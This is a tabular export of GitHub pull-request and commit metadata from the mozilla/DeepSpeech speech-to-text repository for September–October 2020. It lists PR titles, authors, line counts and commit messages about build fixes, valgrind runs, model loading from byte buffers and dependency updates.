429,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3360,3360,Fix binding of UTF8Alphabet class in decoder package,,reuben,477142,2020-10-05T10:42:58Z,MEMBER,True,3758,21,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc2763e0b7125193030c34d7c43c398692130075,Add small bytes output mode scorer for tests
430,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3357,3357,"mono-channel error, not just an assertion",X-DeepSpeech: NOBUILD,JRMeyer,8389864,2020-10-02T20:30:40Z,CONTRIBUTOR,True,4,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,afee570f3c18c5f2a754a5a14e1926a0a363a11b,"mono-channel error, not just an assertion

X-DeepSpeech: NOBUILD"
431,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3356,3356,Linux valgrind,,lissyx,1645737,2020-09-30T17:12:35Z,COLLABORATOR,True,12185,26,48,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,86bba80b0e282e58dee8d14aaf1fb8fba86ca34c,Fix #3292: Linux debug builds
432,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3356,3356,Linux valgrind,,lissyx,1645737,2020-09-30T17:12:35Z,COLLABORATOR,True,12185,26,48,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fdd663829a16f459a4bc52ece7900573af9e42e1,Fix #3355: Add valgrind runs
433,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3354,3354,Fix #3292: Linux debug builds,,lissyx,1645737,2020-09-30T11:45:00Z,COLLABORATOR,False,285,25,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42de692c795d9b4ead3ebe56cf5bf989e15658be,Fix #3292: Linux debug builds
434,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3353,3353,Add valgrind runs,,lissyx,1645737,2020-09-29T14:02:55Z,COLLABORATOR,False,73,0,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,839f5d01522d35db75e3a15e092b662fd5528fa1,Add valgrind runs
435,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3352,3352,Fix #3292: Linux debug builds,,lissyx,1645737,2020-09-29T13:15:54Z,COLLABORATOR,False,154,14,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56aabaafcd5c5f578af20c11942b6dea00b42a8c,Fix #3292: Linux debug builds
436,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3351,3351,Fix leak in C++ client,,lissyx,1645737,2020-09-29T13:14:24Z,COLLABORATOR,True,5,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a34507023e1860a5af7d275246aea30046acbb4,Fix leak in C++ client
437,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3350,3350,Auto-discover lzma/bz2 linkage of libmagic,,lissyx,1645737,2020-09-29T08:54:06Z,COLLABORATOR,True,9,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9674ced520e2e54992f6e86ec056ae443e16248c,Auto-discover lzma/bz2 linkage of libmagic
438,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3345,3345,Pr 3331,,lissyx,1645737,2020-09-28T08:32:44Z,COLLABORATOR,False,632,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,528b47c50326735f6124905c0d7a6f9e32981fe1,Loading model from both path or array of bytes
439,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3345,3345,Pr 3331,,lissyx,1645737,2020-09-28T08:32:44Z,COLLABORATOR,False,632,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7e533b558e2a761c26d41792a275a68eb9b58f6,Loading ExtScorer from array of bytes
440,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3345,3345,Pr 3331,,lissyx,1645737,2020-09-28T08:32:44Z,COLLABORATOR,False,632,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b85b03cf6e6b8af0c0130cfaac9f700b5b45caa5,removing debug info
441,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3345,3345,Pr 3331,,lissyx,1645737,2020-09-28T08:32:44Z,COLLABORATOR,False,632,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5b11bfbb0579b5542c5a46aa43f1e0333c2bf64a,Exposing methods DS_CreateModelFromBuffer and DS_EnableExternalScorerFromBuffer
442,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3345,3345,Pr 3331,,lissyx,1645737,2020-09-28T08:32:44Z,COLLABORATOR,False,632,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8113f982b6bb6fd82971709acbe5411ae7e128b6,Loading tflite buffer from buffer working
443,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3345,3345,Pr 3331,,lissyx,1645737,2020-09-28T08:32:44Z,COLLABORATOR,False,632,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c25b13dc55abc90c36c5235812bfaffb9211b16,Fixing API functions exposition
444,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3345,3345,Pr 3331,,lissyx,1645737,2020-09-28T08:32:44Z,COLLABORATOR,False,632,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c2e17b885b92070102c0d6ae2a5c240bd2b89617,load_trie with default value for load_from_bytes
445,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3344,3344,Use correct 1.15.4 docker image,,lissyx,1645737,2020-09-28T08:24:32Z,COLLABORATOR,True,5,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56264ea4b72b31decf2b5e783630047eddc3771a,Use correct 1.15.4 docker image
446,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3344,3344,Use correct 1.15.4 docker image,,lissyx,1645737,2020-09-28T08:24:32Z,COLLABORATOR,True,5,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dd788a6cea80d04dfd79924edbc7b3b772fe68b8,Fix #3347: Disable Git-LFS on Windows
447,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3343,3343,Use correct 1.15.4 docker image,,lissyx,1645737,2020-09-28T08:23:54Z,COLLABORATOR,True,5,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,57c26827c0e0bee43d5dbcde1454090270f41a10,Use correct 1.15.4 docker image
448,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3343,3343,Use correct 1.15.4 docker image,,lissyx,1645737,2020-09-28T08:23:54Z,COLLABORATOR,True,5,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02548c17de51f30d53b998af80c57d74c20263e8,Fix #3347: Disable Git-LFS on Windows
449,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3340,3340,Fix #3088: Use TensorFlow 1.15.4 with CUDNN fix,,lissyx,1645737,2020-09-25T13:01:02Z,COLLABORATOR,True,6,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,07cbf09f2273239579b1ac8b7635dbcfc4bf929b,Fix #3088: Use TensorFlow 1.15.4 with CUDNN fix
450,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3340,3340,Fix #3088: Use TensorFlow 1.15.4 with CUDNN fix,,lissyx,1645737,2020-09-25T13:01:02Z,COLLABORATOR,True,6,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,62c1075681d8ffd60b6fb1febd43c0b3b3d4f013,Fix #3321: Update NCCL dep to 2.7 following NVIDIA update
451,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3339,3339,Fix missing doc for new Hot Word API,X-DeepSpeech: NOBUILD,lissyx,1645737,2020-09-25T12:40:16Z,COLLABORATOR,True,9,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25c2965da856ced6ad00437c87fc660c69e0df2c,"Fix missing doc for new Hot Word API

X-DeepSpeech: NOBUILD"
452,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3338,3338,Fix #3088: Use TensorFlow 1.15.4 with CUDNN fix,,lissyx,1645737,2020-09-25T12:20:45Z,COLLABORATOR,True,5,2,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,16165f3ddc144d904ed4ed0b6297283fe9688591,Fix #3088: Use TensorFlow 1.15.4 with CUDNN fix
453,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3337,3337,Bump VERSION to 0.9.0-alpha.10,,lissyx,1645737,2020-09-25T09:05:37Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,445ebb233a4d124b720c58117c92e2e2b56bd36d,Bump VERSION to 0.9.0-alpha.10
454,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3331,3331,Enable load_from_bytes of model and ExtScorer,"This PR allows the loading of model and ExtScorer through array of bytes (```string```)

Some observations:

1. For this implementation to work, I had to use ```D_GLIBCXX_USE_CXX11_ABI=1``` when compiling the lib
2. I've added a new argument (```--init_from_bytes```) in the client for testing the loading
3. I do not know how you guys wanna handle the naming of methods, and if you will want to keep backwards compatibility (with ```DS_CreateModel``` for instance)
4. I only tested loading .pb models. I will need some help for implementing the loading of memmapped and tflite models.
",bernardohenz,810340,2020-09-22T12:28:14Z,COLLABORATOR,False,649,104,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06c23fe6d5dfad85f5c20449515bf273241c0d43,Loading model from both path or array of bytes
455,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3331,3331,Enable load_from_bytes of model and ExtScorer,"This PR allows the loading of model and ExtScorer through array of bytes (```string```)

Some observations:

1. For this implementation to work, I had to use ```D_GLIBCXX_USE_CXX11_ABI=1``` when compiling the lib
2. I've added a new argument (```--init_from_bytes```) in the client for testing the loading
3. I do not know how you guys wanna handle the naming of methods, and if you will want to keep backwards compatibility (with ```DS_CreateModel``` for instance)
4. I only tested loading .pb models. I will need some help for implementing the loading of memmapped and tflite models.
",bernardohenz,810340,2020-09-22T12:28:14Z,COLLABORATOR,False,649,104,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc8553b7085d82667beb48c3a11062d9af58f46f,Loading ExtScorer from array of bytes
456,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3331,3331,Enable load_from_bytes of model and ExtScorer,"This PR allows the loading of model and ExtScorer through array of bytes (```string```)

Some observations:

1. For this implementation to work, I had to use ```D_GLIBCXX_USE_CXX11_ABI=1``` when compiling the lib
2. I've added a new argument (```--init_from_bytes```) in the client for testing the loading
3. I do not know how you guys wanna handle the naming of methods, and if you will want to keep backwards compatibility (with ```DS_CreateModel``` for instance)
4. I only tested loading .pb models. I will need some help for implementing the loading of memmapped and tflite models.
",bernardohenz,810340,2020-09-22T12:28:14Z,COLLABORATOR,False,649,104,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6a4e374814f4675e1a441d9997083ceda208b14,removing debug info
457,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3331,3331,Enable load_from_bytes of model and ExtScorer,"This PR allows the loading of model and ExtScorer through array of bytes (```string```)

Some observations:

1. For this implementation to work, I had to use ```D_GLIBCXX_USE_CXX11_ABI=1``` when compiling the lib
2. I've added a new argument (```--init_from_bytes```) in the client for testing the loading
3. I do not know how you guys wanna handle the naming of methods, and if you will want to keep backwards compatibility (with ```DS_CreateModel``` for instance)
4. I only tested loading .pb models. I will need some help for implementing the loading of memmapped and tflite models.
",bernardohenz,810340,2020-09-22T12:28:14Z,COLLABORATOR,False,649,104,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,96710415a1c486d6f3ef85916f7bd518212b7391,Exposing methods DS_CreateModelFromBuffer and DS_EnableExternalScorerFromBuffer
458,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3331,3331,Enable load_from_bytes of model and ExtScorer,"This PR allows the loading of model and ExtScorer through array of bytes (```string```)

Some observations:

1. For this implementation to work, I had to use ```D_GLIBCXX_USE_CXX11_ABI=1``` when compiling the lib
2. I've added a new argument (```--init_from_bytes```) in the client for testing the loading
3. I do not know how you guys wanna handle the naming of methods, and if you will want to keep backwards compatibility (with ```DS_CreateModel``` for instance)
4. I only tested loading .pb models. I will need some help for implementing the loading of memmapped and tflite models.
",bernardohenz,810340,2020-09-22T12:28:14Z,COLLABORATOR,False,649,104,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dd73ec8711c38089b10614e54dd517815b1f5630,Loading tflite buffer from buffer working
459,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3331,3331,Enable load_from_bytes of model and ExtScorer,"This PR allows the loading of model and ExtScorer through array of bytes (```string```)

Some observations:

1. For this implementation to work, I had to use ```D_GLIBCXX_USE_CXX11_ABI=1``` when compiling the lib
2. I've added a new argument (```--init_from_bytes```) in the client for testing the loading
3. I do not know how you guys wanna handle the naming of methods, and if you will want to keep backwards compatibility (with ```DS_CreateModel``` for instance)
4. I only tested loading .pb models. I will need some help for implementing the loading of memmapped and tflite models.
",bernardohenz,810340,2020-09-22T12:28:14Z,COLLABORATOR,False,649,104,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9faeb51f23bd9187316c09c429d08aaf0ec33dba,Fixing API functions exposition
460,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3331,3331,Enable load_from_bytes of model and ExtScorer,"This PR allows the loading of model and ExtScorer through array of bytes (```string```)

Some observations:

1. For this implementation to work, I had to use ```D_GLIBCXX_USE_CXX11_ABI=1``` when compiling the lib
2. I've added a new argument (```--init_from_bytes```) in the client for testing the loading
3. I do not know how you guys wanna handle the naming of methods, and if you will want to keep backwards compatibility (with ```DS_CreateModel``` for instance)
4. I only tested loading .pb models. I will need some help for implementing the loading of memmapped and tflite models.
",bernardohenz,810340,2020-09-22T12:28:14Z,COLLABORATOR,False,649,104,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,71e19bc5ba2d8fb5887a075dd4e2abf60e0a450a,load_trie with default value for load_from_bytes
461,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3331,3331,Enable load_from_bytes of model and ExtScorer,"This PR allows the loading of model and ExtScorer through array of bytes (```string```)

Some observations:

1. For this implementation to work, I had to use ```D_GLIBCXX_USE_CXX11_ABI=1``` when compiling the lib
2. I've added a new argument (```--init_from_bytes```) in the client for testing the loading
3. I do not know how you guys wanna handle the naming of methods, and if you will want to keep backwards compatibility (with ```DS_CreateModel``` for instance)
4. I only tested loading .pb models. I will need some help for implementing the loading of memmapped and tflite models.
",bernardohenz,810340,2020-09-22T12:28:14Z,COLLABORATOR,False,649,104,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3b9d2b00bb953b5f44b81143e41b425f4e86682c,Seting a default value for load_from_bytes in load_lm
462,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3331,3331,Enable load_from_bytes of model and ExtScorer,"This PR allows the loading of model and ExtScorer through array of bytes (```string```)

Some observations:

1. For this implementation to work, I had to use ```D_GLIBCXX_USE_CXX11_ABI=1``` when compiling the lib
2. I've added a new argument (```--init_from_bytes```) in the client for testing the loading
3. I do not know how you guys wanna handle the naming of methods, and if you will want to keep backwards compatibility (with ```DS_CreateModel``` for instance)
4. I only tested loading .pb models. I will need some help for implementing the loading of memmapped and tflite models.
",bernardohenz,810340,2020-09-22T12:28:14Z,COLLABORATOR,False,649,104,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,df40e22ee3474096a08acab85fe3d84997720185,-Change string to char* in the API
463,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,35c8f452d5c78bd9d0bf8f58806e9c269cf51a08,"The CTC decoder timesteps now corresponds to the timesteps of the most
probable CTC path, instead of the earliest timesteps of all possible paths."
464,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,30546991612fd95ba9b0676df2936cc916d23817,PR #3279 - replaced tabulations by spaces
465,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4ddf5eaf9b06c37dd2504f40a1afa5c9daffbc29,PR #3279 - removed unrelated code
466,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f764dc701b32dc6d3c4f5861c50c3b315f466461,PR #3279 - assert instead of reporting error to std::cerr
467,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e5f820302c201d6fb384f5b9ff81e3eb0a33621,PR #3279 - revert to non RVO code
468,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3fc8825199261cbd0f79a62a5137215f2398024f,PR #3279 - revert to non RVO code (fix)
469,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,448b18e8af08ba40e4db1e3475942564497d2152,PR #3279 - avoid unnecessary copies of timesteps vectors
470,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,13217cc83f670333a03a308242fe482167062c8b,PR #3279 - use a tree structure to store timesteps
471,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d4bc521a52d3635bb9bcacad92228dbf9c901100,PR #3279 - use an object pool to store timesteps tree nodes
472,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e312d398ee23abc6fbd56363dd203336f0d5796f,PR #3279 - use unique_ptr instead of shared_ptr in the timestep tree
473,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,63090aa5511bc9b69dd67f76ff74814aa04b5ce1,PR #3279 - Fixed spaces
474,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,579e009281bba65b9751c57f4749ef4d8de48b85,"Revert ""PR #3279 - removed unrelated code""

This reverts commit 78c4ef17b11fe681702cb0619a0b938a0b59f5bd."
475,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,78a1f9c1c1d6ae8fac4c3bb1917da9eb7d3fbd47,PR #3279 - Fixed buggy timestep tree root
476,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3325,3325,Test PR #3279 - timesteps,,reuben,477142,2020-09-17T07:56:02Z,MEMBER,False,273,34,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ced8287e04c6ca9791ac1c143ae65789c1211769,PR #3279 - Made the timestep tree thread safe
477,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3324,3324,Added `os` import in front of `makedirs`,Was using this script and noticed the missing `os` import.,gtcooke94,16962414,2020-09-16T18:34:17Z,NONE,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,20ad86c6ab39a097960df298de0b228306a0ab1c,Added `os` import in front of `makedirs`
478,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3322,3322,Fix #3321: Update NCCL dep to 2.7 following NVIDIA update,,lissyx,1645737,2020-09-15T11:43:53Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,76d5fb6389b73d20fcd4282541aec954f28b940c,Fix #3321: Update NCCL dep to 2.7 following NVIDIA update
479,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3320,3320,Fix #3299: Build KenLM on CI,,lissyx,1645737,2020-09-11T08:32:41Z,COLLABORATOR,True,1246,42,51,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bf5ae9cf8a131eb69a07b1dffdb8b01af8240579,Fix #3299: Build KenLM on CI
480,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3319,3319,Simplified git clone msg to prevent error reportings,"As discussed yesterday, this is the fix for this [PR](https://github.com/mozilla/DeepSpeech/pull/3314). 

And looks like Atom found a trailing whitespace.",olafthiele,30040326,2020-09-10T09:01:31Z,CONTRIBUTOR,True,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de1e3d7aa0d0f1d93b3565518aa6f02255335e99,Simplified install text
481,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3318,3318,Fix #3316: Add Electron 10.x,,lissyx,1645737,2020-09-10T06:54:26Z,COLLABORATOR,True,231,15,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a4d6c672d41f61f479fc7c72a31be54bcee4c592,Fix #3316: Add Electron 10.x
482,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3318,3318,Fix #3316: Add Electron 10.x,,lissyx,1645737,2020-09-10T06:54:26Z,COLLABORATOR,True,231,15,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2e92f53aace4d981af6fd4d844b1f8cb2cd2b2d6,Use bigger build machine to avoid recurrent breakages of Linux/CUDA builds
483,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3315,3315,Bump VERSION to v0.9.0-alpha.8,,lissyx,1645737,2020-09-09T06:50:12Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b30e0fb815b94b4b258ce64eeed541a59b5f0da2,Bump VERSION to v0.9.0-alpha.8
484,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3314,3314,Trying to get fewer master branch training errors,"As more and more people simply clone the master branch, maybe this steers them towards using a released branch.",olafthiele,30040326,2020-09-08T12:55:40Z,CONTRIBUTOR,True,4,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,39a963af9038f6aa07773a064e00bc7104166c7f,Update TRAINING.rst
485,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3314,3314,Trying to get fewer master branch training errors,"As more and more people simply clone the master branch, maybe this steers them towards using a released branch.",olafthiele,30040326,2020-09-08T12:55:40Z,CONTRIBUTOR,True,4,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2e88a30de2310bd45f6445afd46461a2214ecb1,More compact version
486,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3313,3313,fix missing import 'sys',,erogol,1402048,2020-09-08T08:15:34Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b2df36079977bb6dd7977e3d979578e20ff475d7,fix missing import 'sys'
487,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3309,3309,Docs contributing,"First start to flesh out more elaborate contribution guidelines + best practices

X-DeepSpeech: NOBUILD",JRMeyer,8389864,2020-09-02T14:57:37Z,CONTRIBUTOR,True,33,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fdf6aeb22b9eae7931a9a73051f65f363efc6ef8,first stab at CONTRIBUTING.rst
488,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3309,3309,Docs contributing,"First start to flesh out more elaborate contribution guidelines + best practices

X-DeepSpeech: NOBUILD",JRMeyer,8389864,2020-09-02T14:57:37Z,CONTRIBUTOR,True,33,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff057e86c7d6f25a7541b5b843d76082a0387cd9,bold instead of ticks
489,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3308,3308,Fix #3305: Use proper bazel level disk caching,,lissyx,1645737,2020-09-02T14:30:05Z,COLLABORATOR,False,88,79,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de29d2d1b4033bf1bac5c7285a12897f6f25687b,Fix #3305: Use proper bazel level disk caching
